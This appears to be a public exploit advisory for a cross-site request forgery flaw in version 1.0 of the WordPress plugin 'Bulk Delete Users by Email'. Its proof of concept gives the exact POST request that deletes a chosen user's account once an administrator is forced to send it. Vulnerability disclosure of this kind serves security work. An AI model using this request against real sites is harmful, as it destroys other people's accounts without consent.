@@ -1,0 +1,23 @@
+# Exploit Title: Bulk Delete Users by Email, Wordpress Plugin 1.0 - CSRF
+# Google Dork: N/A
+# Date: 05.09.2014
+# Exploit Author: Fikri Fadzil - fikri.fadzil@impact-alliance.org
+# Vendor Homepage - http://www.speakdigital.co.uk/
+# Software Link: https://wordpress.org/plugins/bulk-delete-users-by-email/
+# Version: 1.0
+# Tested on: PHP
+
+
+Description:
+This plugin will allow administrator to delete user(s) account by entering
+their email address.
+
+Proof of Concept
+1. Force the administrator to send below request:
+
+URL :
+http://localhost/blog/wp-admin/admin.php?page=bulk-delete-users-by-email/plugin.php
+METHOD : POST
+REQUEST : de-text=<victim email>&submit=Search+and+Delete
+
+* As the result, user with the given email address will be deleted.
